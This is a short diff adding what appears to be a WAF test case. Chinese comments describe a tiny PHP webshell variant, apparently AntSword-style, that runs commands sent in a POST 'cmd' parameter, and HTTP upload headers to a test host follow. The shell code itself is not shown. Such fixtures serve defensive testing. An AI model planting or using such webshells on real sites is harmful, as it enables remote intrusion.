@@ -1,0 +1,15 @@
+# webshell_caidao_call_user_func_3
+# 这是一个极其简单的蚁剑Webshell变种文件，采用PHP语言编写。攻击者可以通过发送POST请求，将内容传入cmd参数，并使用assertl函数执行命令
+# 基本信息：
+# - 文件名：waf/webshell_3.php
+# - 文件大小：49B
+# 行为描述：
+# - 命令执行：接收并执行攻击者发送的系统命令，例如列出目录内容、修改文件权限等。
+POST /?bid=hd_tag_m8mv23r1 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23r1
+RM-PRO-Token: 8d58e5c612bf0d90dc3be3501294400e
+RM-PRO-Time: 1742808338730
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=B3-IgOzZSPxxBAb3qRrfGFXLO1OOK8WW
+
